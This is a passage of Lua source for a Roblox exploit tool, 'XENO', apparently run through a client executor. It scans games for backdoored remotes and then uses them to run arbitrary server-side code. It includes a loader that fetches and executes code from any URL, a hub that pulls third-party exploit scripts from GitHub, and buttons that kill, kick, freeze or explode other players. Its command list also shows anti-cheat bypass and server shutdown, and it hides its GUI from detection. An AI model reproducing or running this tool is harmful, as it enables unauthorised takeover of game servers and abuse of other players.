        patternsTotal=scannedCount*#self.patterns,
    }
    self.scanning=false
    if statusCallback then statusCallback("done",#self.confirmed,scannedCount,nil,self.scanStats) end
    return self.confirmed
end

function BD:connect(e) self.active=e end
function BD:disconnect() self.active=nil end
function BD:isConnected() return self.active~=nil end

function BD:exec(code)
    if not self.active then return false,"No backdoor" end
    local pats=self.active.inst:IsA("RemoteFunction") and self.rfPatterns or self.patterns
    local pat=pats[self.active.patternIdx]
    if not pat then return false,"Bad pattern" end
    local ok,err=pcall(function() pat.fn(self.active.inst,code) end)
    return ok,err
end

function BD:requireModule(id)
    return self:exec(string.format('pcall(function() local m=require(%d);if type(m)=="function" then m() elseif type(m)=="table" then if m.init then m.init() elseif m.Init then m.Init() elseif m.Start then m.Start() end end end)',tonumber(id) or 0))
end

function BD:loadUrl(url)
    return self:exec(string.format('loadstring(game:GetService("HttpService"):GetAsync("%s"))()',tostring(url)))
end

function BD:resetScanned()
    self.tested={}
    self.confirmed={}
    self.scanStats={remotesScanned=0,timeElapsed=0,patternsTotal=0}
end

-- ═══════════════════════════════════════════════════
--  6 · GUI CONSTRUCTION
-- ═══════════════════════════════════════════════════

local Notify

local gui = Instance.new("ScreenGui")
gui.Name = "XenoFramework_" .. U.uid()
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999

pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
pcall(function() if gethui then gui.Parent = gethui() end end)
if not gui.Parent then
    local ok = pcall(function() gui.Parent = CoreGui end)
    if not ok then gui.Parent = LP:WaitForChild("PlayerGui") end
end

local T = CFG.Theme

local toastHolder = U.new("Frame",{Name="Toasts",Size=UDim2.new(0,300,1,0),Position=UDim2.new(1,-310,0,0),BackgroundTransparency=1,Parent=gui},{
    U.new("UIListLayout",{Padding=UDim.new(0,6),VerticalAlignment=Enum.VerticalAlignment.Bottom,HorizontalAlignment=Enum.HorizontalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder}),
    U.new("UIPadding",{PaddingBottom=UDim.new(0,18)}),
})

Notify = function(text,color,duration)
    color=color or T.Text
    duration=duration or CFG.ToastLife
    local toast = U.new("Frame",{Size=UDim2.new(1,0,0,36),BackgroundColor3=T.Surface,BackgroundTransparency=1,BorderSizePixel=0,ClipsDescendants=true,Parent=toastHolder},{
        U.new("UICorner",{CornerRadius=UDim.new(0,8)}),
        U.new("UIStroke",{Color=color,Thickness=1,Transparency=0.55}),
        U.new("Frame",{Size=UDim2.new(0,3,1,0),BackgroundColor3=color,BorderSizePixel=0}),
        U.new("TextLabel",{Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,14,0,0),BackgroundTransparency=1,Text=text,TextColor3=T.Text,TextSize=13,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd}),
    })
    U.tween(toast,{BackgroundTransparency=0.12},0.3)
    task.delay(duration,function()
        U.tween(toast,{BackgroundTransparency=1,Size=UDim2.new(1,0,0,0)},0.35)
        task.wait(0.38)
        pcall(function() toast:Destroy() end)
    end)
end

-- Main Window
local W = CFG.Window
local main = U.new("Frame",{Name="Main",Size=UDim2.new(0,W.Width,0,W.Height),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.BG,BorderSizePixel=0,ClipsDescendants=true,Parent=gui},{
    U.new("UICorner",{CornerRadius=UDim.new(0,12)}),
    U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.3}),
})
U.new("ImageLabel",{Size=UDim2.new(1,44,1,44),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Image="rbxassetid://6015897843",ImageColor3=Color3.new(0,0,0),ImageTransparency=0.5,ScaleType=Enum.ScaleType.Slice,SliceCenter=Rect.new(49,49,450,450),ZIndex=-1,Parent=main})

-- Top bar
local topBar = U.new("Frame",{Size=UDim2.new(1,0,0,40),BackgroundColor3=T.Surface,BorderSizePixel=0,Parent=main},{
    U.new("UICorner",{CornerRadius=UDim.new(0,12)}),
    U.new("Frame",{Size=UDim2.new(1,0,0,14),Position=UDim2.new(0,0,1,-14),BackgroundColor3=T.Surface,BorderSizePixel=0}),
})
U.new("TextLabel",{Size=UDim2.new(0,200,1,0),Position=UDim2.new(0,16,0,0),BackgroundTransparency=1,Text="⚡ XENO",TextColor3=T.Primary,TextSize=16,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=topBar})
U.new("TextLabel",{Size=UDim2.new(0,60,1,0),Position=UDim2.new(0,86,0,0),BackgroundTransparency=1,Text="v"..CFG.Version,TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=topBar})

local statusDot = U.new("Frame",{Size=UDim2.new(0,8,0,8),Position=UDim2.new(0,150,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=T.Sub,BorderSizePixel=0,Parent=topBar},{U.new("UICorner",{CornerRadius=UDim.new(1,0)})})
local statusLabel = U.new("TextLabel",{Size=UDim2.new(0,160,1,0),Position=UDim2.new(0,164,0,0),BackgroundTransparency=1,Text="Starting...",TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=topBar})
local function setStatus(t,c) statusLabel.Text=t; U.tween(statusDot,{BackgroundColor3=c},0.3) end

-- Window controls
local controlsLayout = U.new("Frame",{Size=UDim2.new(0,74,0,32),Position=UDim2.new(1,-82,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundTransparency=1,Parent=topBar},{
    U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),VerticalAlignment=Enum.VerticalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder}),
})

local function windowBtn(icon,order,cb)
    local btn = U.new("TextButton",{Size=UDim2.new(0,32,0,32),BackgroundColor3=T.Card,BackgroundTransparency=0.6,BorderSizePixel=0,Text=icon,TextColor3=T.Sub,TextSize=16,Font=Enum.Font.GothamBold,AutoButtonColor=false,LayoutOrder=order,Parent=controlsLayout},{U.new("UICorner",{CornerRadius=UDim.new(0,8)})})
    btn.MouseEnter:Connect(function() U.tween(btn,{BackgroundTransparency=0.2,TextColor3=T.Text},0.18) end)
    btn.MouseLeave:Connect(function() U.tween(btn,{BackgroundTransparency=0.6,TextColor3=T.Sub},0.18) end)
    btn.MouseButton1Click:Connect(cb)
    return btn
end

local minimized = false
windowBtn("—",1,function()
    minimized = not minimized
    U.tween(main,{Size=UDim2.new(0,W.Width,0,minimized and 40 or W.Height)},0.35)
end)
windowBtn("✕",2,function()
    U.tween(main,{Size=UDim2.new(0,0,0,0)},0.4,Enum.EasingStyle.Back,Enum.EasingDirection.In)
    task.wait(0.42)
    gui:Destroy()
end)

-- Draggable
do
    local dragging,dragStart,startPos
    topBar.InputBegan:Connect(function(input)
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            dragging=true
            dragStart=input.Position
            startPos=main.Position
            input.Changed:Connect(function()
                if input.UserInputState==Enum.UserInputState.End then dragging=false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
            local d=input.Position-dragStart
            main.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
        end
    end)
end

-- ═══════════════════════════════════════════════════
--  7 · SIDEBAR + PAGES
-- ═══════════════════════════════════════════════════

local sidebar = U.new("Frame",{Size=UDim2.new(0,150,1,-40),Position=UDim2.new(0,0,0,40),BackgroundColor3=T.Surface,BorderSizePixel=0,Parent=main},{
    U.new("UIPadding",{PaddingTop=UDim.new(0,10),PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)}),
    U.new("UIListLayout",{Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder}),
})
local pageContainer = U.new("Frame",{Size=UDim2.new(1,-150,1,-40),Position=UDim2.new(0,150,0,40),BackgroundColor3=T.BG,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
local pages,currentTab,tabButtons = {},nil,{}

local function makePage(n)
    local p = U.new("ScrollingFrame",{Name=n,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=T.Primary,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Visible=false,Parent=pageContainer},{
        U.new("UIListLayout",{Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder,HorizontalAlignment=Enum.HorizontalAlignment.Center}),
        U.new("UIPadding",{PaddingTop=UDim.new(0,14),PaddingBottom=UDim.new(0,14),PaddingLeft=UDim.new(0,14),PaddingRight=UDim.new(0,14)}),
    })
    pages[n]=p
    return p
end

local function switchTab(n)
    if currentTab==n then return end
    for k,p in pairs(pages) do p.Visible=(k==n) end
    for k,b in pairs(tabButtons) do
        if k==n then
            U.tween(b,{BackgroundColor3=T.Primary,BackgroundTransparency=0.15,TextColor3=T.Text},0.22)
        else
            U.tween(b,{BackgroundColor3=T.Card,BackgroundTransparency=0.7,TextColor3=T.Sub},0.22)
        end
    end
    currentTab=n
end

local tabDefs = {
    {name="Dashboard",icon="⌂",order=1},
    {name="Players",icon="♟",order=2},
    {name="Commands",icon="›_",order=3},
    {name="Scripts",icon="{ }",order=4},
    {name="Server",icon="⚙",order=5},
    {name="Anti-Cheat",icon="🛡️",order=6},
}

for _,td in ipairs(tabDefs) do
    makePage(td.name)
    local btn = U.new("TextButton",{Size=UDim2.new(1,0,0,34),BackgroundColor3=T.Card,BackgroundTransparency=0.7,BorderSizePixel=0,Text="  "..td.icon.."   "..td.name,TextColor3=T.Sub,TextSize=13,Font=Enum.Font.GothamSemibold,TextXAlignment=Enum.TextXAlignment.Left,AutoButtonColor=false,LayoutOrder=td.order,Parent=sidebar},{U.new("UICorner",{CornerRadius=UDim.new(0,8)})})
    btn.MouseEnter:Connect(function() if currentTab~=td.name then U.tween(btn,{BackgroundTransparency=0.4},0.15) end end)
    btn.MouseLeave:Connect(function() if currentTab~=td.name then U.tween(btn,{BackgroundTransparency=0.7},0.15) end end)
    btn.MouseButton1Click:Connect(function() switchTab(td.name) end)
    tabButtons[td.name]=btn
end

-- ═══════════════════════════════════════════════════
--  8 · UI HELPERS
-- ═══════════════════════════════════════════════════

local function card(parent,height,order)
    return U.new("Frame",{Size=UDim2.new(1,0,0,height or 90),BackgroundColor3=T.Card,BorderSizePixel=0,LayoutOrder=order or 0,Parent=parent},{
        U.new("UICorner",{CornerRadius=UDim.new(0,10)}),
        U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.5}),
        U.new("UIPadding",{PaddingTop=UDim.new(0,10),PaddingBottom=UDim.new(0,10),PaddingLeft=UDim.new(0,12),PaddingRight=UDim.new(0,12)}),
    })
end

local function heading(parent,text,order)
    return U.new("TextLabel",{Size=UDim2.new(1,0,0,22),BackgroundTransparency=1,Text=text,TextColor3=T.Text,TextSize=15,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=order or 0,Parent=parent})
end

local function actionBtn(parent,text,color,order,cb)
    color=color or T.Primary
    local btn = U.new("TextButton",{Size=UDim2.new(0,110,0,30),BackgroundColor3=color,BackgroundTransparency=0.15,BorderSizePixel=0,Text=text,TextColor3=T.Text,TextSize=12,Font=Enum.Font.GothamSemibold,AutoButtonColor=false,LayoutOrder=order or 0,Parent=parent},{U.new("UICorner",{CornerRadius=UDim.new(0,7)})})
    btn.MouseEnter:Connect(function() U.tween(btn,{BackgroundTransparency=0},0.15) end)
    btn.MouseLeave:Connect(function() U.tween(btn,{BackgroundTransparency=0.15},0.15) end)
    if cb then btn.MouseButton1Click:Connect(cb) end
    return btn
end

local function inputField(parent,ph,order)
    local box = U.new("TextBox",{Size=UDim2.new(1,0,0,32),BackgroundColor3=T.Surface,BorderSizePixel=0,Text="",PlaceholderText=ph or "",PlaceholderColor3=T.Sub,TextColor3=T.Text,TextSize=13,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,LayoutOrder=order or 0,Parent=parent},{
        U.new("UICorner",{CornerRadius=UDim.new(0,7)}),
        U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.4}),
        U.new("UIPadding",{PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10)}),
    })
    box.Focused:Connect(function() local s=box:FindFirstChildWhichIsA("UIStroke"); if s then U.tween(s,{Color=T.Primary,Transparency=0},0.2) end end)
    box.FocusLost:Connect(function() local s=box:FindFirstChildWhichIsA("UIStroke"); if s then U.tween(s,{Color=T.Border,Transparency=0.4},0.2) end end)
    return box
end

-- ═══════════════════════════════════════════════════
--  9 · DASHBOARD
-- ═══════════════════════════════════════════════════

local playerCountLbl,backdoorCountLbl,statusValLbl,scanResultsLabel

do
    local pg=pages.Dashboard
    heading(pg,"Dashboard",1)

    local infoRow = U.new("Frame",{Size=UDim2.new(1,0,0,60),BackgroundTransparency=1,LayoutOrder=2,Parent=pg},{
        U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder}),
    })

    local function infoCard(label,init,col,order)
        local c = U.new("Frame",{Size=UDim2.new(0.32,-4,1,0),BackgroundColor3=T.Card,BorderSizePixel=0,LayoutOrder=order,Parent=infoRow},{
            U.new("UICorner",{CornerRadius=UDim.new(0,8)}),
            U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.6}),
        })
        U.new("TextLabel",{Size=UDim2.new(1,-16,0,16),Position=UDim2.new(0,8,0,8),BackgroundTransparency=1,Text=label,TextColor3=T.Sub,TextSize=10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=c})
        return U.new("TextLabel",{Size=UDim2.new(1,-16,0,22),Position=UDim2.new(0,8,0,28),BackgroundTransparency=1,Text=init,TextColor3=col,TextSize=17,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=c})
    end

    playerCountLbl = infoCard("PLAYERS",tostring(#Players:GetPlayers()),T.Accent,1)
    backdoorCountLbl = infoCard("CONFIRMED","—",T.Warn,2)
    statusValLbl = infoCard("STATUS","Ready",T.Sub,3)

    Players.PlayerAdded:Connect(function() playerCountLbl.Text=tostring(#Players:GetPlayers()) end)
    Players.PlayerRemoving:Connect(function() task.wait(0.1); playerCountLbl.Text=tostring(#Players:GetPlayers()) end)

    heading(pg,"Backdoor Scanner",3)
    local scanCard = card(pg,170,4)

    scanResultsLabel = U.new("TextLabel",{Size=UDim2.new(1,0,0,100),BackgroundTransparency=1,
        Text='<font color="#9399B2">Throttled engine ready.\n'..#BD.patterns..' patterns · '..#BD.fingerprints..' fingerprints\nXeno executor compatible build</font>',
        TextColor3=T.Sub,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=scanCard})

    local scanBtns = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=scanCard},{
        U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder}),
    })

    local scanRunning = false
    local function runScan(qm)
        if scanRunning then return end
        scanRunning=true
        BD:resetScanned()
        setStatus("Scanning...",T.Warn)
        statusValLbl.Text="Scanning..."
        statusValLbl.TextColor3=T.Warn
        backdoorCountLbl.Text="..."
        local ms=qm and "QUICK" or "DEEP"

        task.spawn(function()
            local confirmed = BD:scan(function(phase,total,cur,name,extra)
                if phase=="gathered" then
                    local i=extra
                    scanResultsLabel.Text=string.format('<font color="#F9E2AF">[%s] %d remotes</font>\n<font color="#A6E3A1">%d exact · %d pattern</font> <font color="#9399B2">· %d short · %d other</font>',i.mode,total,i.exact,i.pattern,i.short,i.other)
                    task.wait(0.8)
                elseif phase=="validating" then
                    local i=extra
                    scanResultsLabel.Text=string.format('<font color="#F9E2AF">[%s] %d/%d — %s</font>\n<font color="#9399B2">%.1fs · Confirmed: %d</font>',ms,cur,total,tostring(name),i.elapsed,i.confirmed)
                    setStatus(cur.."/"..total,T.Warn)
                elseif phase=="found" then
                    Notify("✓ "..extra.name.."["..extra.fingerprint.."]",T.OK,5)
                end
            end,qm)

            local st=BD.scanStats
            backdoorCountLbl.Text=tostring(#confirmed)

            if #confirmed==0 then
                scanResultsLabel.Text='<font color="#F3788C">No backdoors found.</font>\n<font color="#9399B2">'..st.remotesScanned..' remotes in '..string.format("%.1fs",st.timeElapsed)..'</font>'
                setStatus("Clean",T.Err)
                statusValLbl.Text="Clean"
                statusValLbl.TextColor3=T.Err
            else
                local lines={string.format('<font color="#A6E3A1">✓ %d found in %.1fs</font>',#confirmed,st.timeElapsed)}
                for i,e in ipairs(confirmed) do
                    lines[#lines+1]=string.format('<font color="#A6E3A1">✓ %s</font> <font color="#F9E2AF">[%s]</font> <font color="#9399B2">%s</font>',e.name,e.fingerprint,e.patternName)
                    if i>=3 then break end
                end
                scanResultsLabel.Text=table.concat(lines,"\n")
                BD:connect(confirmed[1])
                setStatus(confirmed[1].name.." ["..confirmed[1].fingerprint.."]",T.OK)
                statusValLbl.Text="Connected"
                statusValLbl.TextColor3=T.OK
                Notify("✓ "..confirmed[1].name.." ["..confirmed[1].fingerprint.."]",T.OK,6)
            end
            scanRunning=false
        end)
    end

    actionBtn(scanBtns,"⚡ Quick",T.Primary,1,function() runScan(true) end)
    actionBtn(scanBtns,"🔍 Deep",T.Accent,2,function() runScan(false) end)
    actionBtn(scanBtns,"⚡ Con#1",T.OK,3,function()
        if #BD.confirmed==0 then Notify("Scan first",T.Err); return end
        BD:connect(BD.confirmed[1])
        setStatus(BD.confirmed[1].name,T.OK)
        statusValLbl.Text="Connected"
        statusValLbl.TextColor3=T.OK
    end)
    actionBtn(scanBtns,"⛔ DC",T.Err,4,function()
        BD:disconnect()
        setStatus("DC",T.Err)
        statusValLbl.Text="DC"
        statusValLbl.TextColor3=T.Err
    end)

    heading(pg,"Manual Connect",5)
    local mc = card(pg,80,6)
    U.new("TextLabel",{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="Remote path:",TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=mc})
    local mi = inputField(mc,"e.g. ReplicatedStorage.RemoteEvent",2)
    mi.Size=UDim2.new(0.72,0,0,30)
    mi.Position=UDim2.new(0,0,1,-32)

    local mb = actionBtn(mc,"Validate",T.Accent,3,function()
        local path=mi.Text
        if path=="" then return end
        local obj=nil
        pcall(function()
            obj=game
            for part in path:gmatch("[^%.]+") do
                if part~="game" then obj=obj:FindFirstChild(part) end
            end
        end)
        if not obj or (not obj:IsA("RemoteEvent") and not obj:IsA("RemoteFunction")) then
            Notify("Not found",T.Err)
            return
        end
        Notify("Validating...",T.Warn)
        task.spawn(function()
            local v,pi,pn = BD:validateThrottled(obj)
            if v then
                local fp=BD:fingerprint(obj,pn)
                local entry={inst=obj,name=obj.Name,path=obj:GetFullName(),type=obj.ClassName,patternIdx=pi,patternName=pn,fingerprint=fp}
                BD:connect(entry)
                BD.confirmed[#BD.confirmed+1]=entry
                backdoorCountLbl.Text=tostring(#BD.confirmed)
                setStatus(obj.Name.." ["..fp.."]",T.OK)
                statusValLbl.Text="Connected"
                statusValLbl.TextColor3=T.OK
                Notify("✓ "..obj.Name.." ["..fp.."]",T.OK)
            else
                Notify("✗ Not a backdoor",T.Err)
            end
        end)
    end)
    mb.Position=UDim2.new(0.74,4,1,-32)
end

-- ═══════════════════════════════════════════════════
--  10 · PLAYERS
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Players
    heading(pg,"Player Management",1)
    local targetInput = inputField(pg,"Player (me/all/others)...",2)
    heading(pg,"Quick Actions",3)

    local ag = U.new("Frame",{Size=UDim2.new(1,0,0,220),BackgroundTransparency=1,LayoutOrder=4,Parent=pg},{
        U.new("UIGridLayout",{CellSize=UDim2.new(0,120,0,32),CellPadding=UDim2.new(0,6,0,6),SortOrder=Enum.SortOrder.LayoutOrder}),
    })

    local pActs = {
        {"💀 Kill","kill",T.Err},{"🚪 Kick","kick",T.Err},{"🛡️ God","god",T.OK},
        {"❄️ Freeze","freeze",T.Accent},{"🔥 Thaw","thaw",T.Warn},{"👻 Invis","invisible",T.Sub},
        {"👁️ Visible","visible",T.Text},{"💥 Explode","explode",T.Err},{"🔥 Fire","fire",T.Warn},
        {"✨ Sparkles","sparkles",T.Accent},{"🪑 Sit","sit",T.Sub},{"⬆️ Jump","jump",T.OK},
        {"🏃 Speed","speed",T.Primary},{"🦘 JPwr","jpower",T.Primary},
        {"🛡️ FF","ff",T.OK},{"🚫 UnFF","unff",T.Err},
    }

    for i,act in ipairs(pActs) do
        actionBtn(ag,act[1],act[3],i,function()
            if not BD:isConnected() then Notify("Not connected!",T.Err); return end
            local q=targetInput.Text~="" and targetInput.Text or "me"
            local targets=U.findPlayers(q)
            if #targets==0 then Notify("No player",T.Err); return end

            for _,plr in ipairs(targets) do
                local pn=string.format('game.Players["%s"]',plr.Name)
                local ch=pn..".Character"
                local hr=ch..":FindFirstChild('HumanoidRootPart')"
                local hm=ch..':FindFirstChildWhichIsA("Humanoid")'
                local code=""
                local cmd=act[2]

                if cmd=="kill" then code="pcall(function() "..ch..":BreakJoints() end)"
                elseif cmd=="kick" then code=pn..':Kick("XENO")'
                elseif cmd=="god" then code="pcall(function() local h="..hm..";h.MaxHealth=math.huge;h.Health=math.huge end)"
                elseif cmd=="freeze" then code="pcall(function() "..hr..".Anchored=true end)"
                elseif cmd=="thaw" then code="pcall(function() "..hr..".Anchored=false end)"
                elseif cmd=="invisible" then code="pcall(function() for _,v in pairs("..ch..":GetDescendants()) do if v:IsA('BasePart') then v.Transparency=1 end if v:IsA('Decal') then v.Transparency=1 end end end)"
                elseif cmd=="visible" then code="pcall(function() for _,v in pairs("..ch..":GetDescendants()) do if v:IsA('BasePart') and v.Name~='HumanoidRootPart' then v.Transparency=0 end if v:IsA('Decal') then v.Transparency=0 end end end)"
                elseif cmd=="explode" then code="pcall(function() local e=Instance.new('Explosion',workspace);e.Position="..hr..".Position end)"
                elseif cmd=="fire" then code="pcall(function() Instance.new('Fire',"..hr..") end)"
                elseif cmd=="sparkles" then code="pcall(function() Instance.new('Sparkles',"..hr..") end)"
                elseif cmd=="sit" then code="pcall(function() "..hm..".Sit=true end)"
                elseif cmd=="jump" then code="pcall(function() "..hm..".Jump=true end)"
                elseif cmd=="speed" then code="pcall(function() "..hm..".WalkSpeed=100 end)"
                elseif cmd=="jpower" then code="pcall(function() local h="..hm..";h.UseJumpPower=true;h.JumpPower=100 end)"
                elseif cmd=="ff" then code='pcall(function() Instance.new("ForceField",'..ch..") end)"
                elseif cmd=="unff" then code="pcall(function() for _,v in pairs("..ch..":GetChildren()) do if v:IsA('ForceField') then v:Destroy() end end end)"
                end

                BD:exec(code)
                if AC.active and (cmd=="speed" or cmd=="jpower" or cmd=="god") then
                    task.delay(0.3,function() AC:syncAfterChange() end)
                end
                Notify(act[1].." → "..plr.Name,T.OK)
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  11 · COMMANDS
-- ═══════════════════════════════════════════════════

local cmdHistory,addHistory,cmdInput = {},nil,nil

do
    local pg=pages.Commands
    heading(pg,"Console",1)
    cmdInput = inputField(pg,CFG.Prefix.."command...",2)

    local hc = card(pg,230,3)
    local hl = U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text='<font color="#9399B2">History...</font>',TextColor3=T.Sub,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=hc})

    addHistory = function(e,c)
        table.insert(cmdHistory,1,{text=e,color=c or "#CDD6F4"})
        if #cmdHistory>CFG.MaxHistory then table.remove(cmdHistory) end
        local lines={}
        for i=1,math.min(#cmdHistory,24) do
            lines[#lines+1]=string.format('<font color="%s">%s</font>',cmdHistory[i].color,cmdHistory[i].text)
        end
        hl.Text=table.concat(lines,"\n")
    end

    heading(pg,"Reference",4)
    local rc = card(pg,160,5)
    U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=table.concat({
        '<font color="#8A2BE2">Player:</font> ;kill ;kick ;god ;freeze ;thaw ;tp ;speed ;jp',
        '  ;ff ;unff ;explode ;sit ;invis ;visible ;fire ;sparkles','',
        '<font color="#8A2BE2">Server:</font> ;time ;fog ;gravity ;music ;stopmusic',
        '  ;msg ;hint ;shutdown ;lock ;unlock','',
        '<font color="#8A2BE2">AC:</font> ;bypass ;acstatus ;clearflags','',
        '<font color="#8A2BE2">Util:</font> ;require ;loadurl ;exec ;cmds ;clear ;status',
    },"\n"),TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=rc})
end

-- ═══════════════════════════════════════════════════
--  12 · SCRIPTS
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Scripts

    heading(pg,"Require Loader",1)
    local rc = card(pg,80,2)
    local ri = inputField(rc,"Module ID...",1)
    ri.Size=UDim2.new(1,0,0,30)
    local rb = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=rc},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(rb,"⚡ Require",T.Primary,1,function()
        local id=tonumber(ri.Text)
        if not id then Notify("Invalid",T.Err); return end
        if not BD:isConnected() then Notify("Not connected!",T.Err); return end
        BD:requireModule(id)
        Notify("Required: "..id,T.OK)
    end)

    heading(pg,"URL Loader",3)
    local uc = card(pg,80,4)
    local ui = inputField(uc,"URL...",1)
    ui.Size=UDim2.new(1,0,0,30)
    local ub = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=uc},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(ub,"🌐 Load",T.Accent,1,function()
        if ui.Text=="" or not BD:isConnected() then Notify("Error",T.Err); return end
        BD:loadUrl(ui.Text)
        Notify("Loaded",T.OK)
    end)

    heading(pg,"SS Executor",5)
    local ec = card(pg,145,6)
    local eb = U.new("TextBox",{Size=UDim2.new(1,0,0,88),BackgroundColor3=T.Surface,BorderSizePixel=0,Text="",PlaceholderText="-- Server-side Lua...",PlaceholderColor3=T.Sub,TextColor3=T.OK,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,MultiLine=true,ClearTextOnFocus=false,TextWrapped=true,Parent=ec},{
        U.new("UICorner",{CornerRadius=UDim.new(0,7)}),
        U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.4}),
        U.new("UIPadding",{PaddingTop=UDim.new(0,8),PaddingBottom=UDim.new(0,8),PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10)}),
    })
    local ebs = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=ec},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(ebs,"▶ Execute",T.OK,1,function()
        if eb.Text=="" or not BD:isConnected() then Notify("Error",T.Err); return end
        BD:exec(eb.Text)
        Notify("Executed",T.OK)
    end)
    actionBtn(ebs,"🗑️ Clear",T.Sub,2,function() eb.Text="" end)

    heading(pg,"Hub",7)
    for idx,e in ipairs({
        {name="Infinite Yield",url="https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
        {name="Dex Explorer",url="https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
        {name="Remote Spy",url="https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"},
    }) do
        local hc = card(pg,45,7+idx)
        U.new("TextLabel",{Size=UDim2.new(0.6,0,1,0),BackgroundTransparency=1,Text="📜 "..e.name,TextColor3=T.Text,TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=hc})
        local hb = actionBtn(hc,"Execute",T.Primary,1,function()
            if not BD:isConnected() then return end
            BD:loadUrl(e.url)
            Notify("Loaded: "..e.name,T.OK)
        end)
        hb.Position=UDim2.new(1,-110,0.5,-15)
    end
end

-- ═══════════════════════════════════════════════════
--  13 · SERVER
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Server
    heading(pg,"Server Controls",1)

    local lg = U.new("Frame",{Size=UDim2.new(1,0,0,70),BackgroundTransparency=1,LayoutOrder=2,Parent=pg},{
        U.new("UIGridLayout",{CellSize=UDim2.new(0,110,0,30),CellPadding=UDim2.new(0,6,0,6),SortOrder=Enum.SortOrder.LayoutOrder}),
    })

    for i,sa in ipairs({
        {"☀️ Day","game.Lighting.ClockTime=14",T.Warn},
        {"🌙 Night","game.Lighting.ClockTime=0",T.Accent},
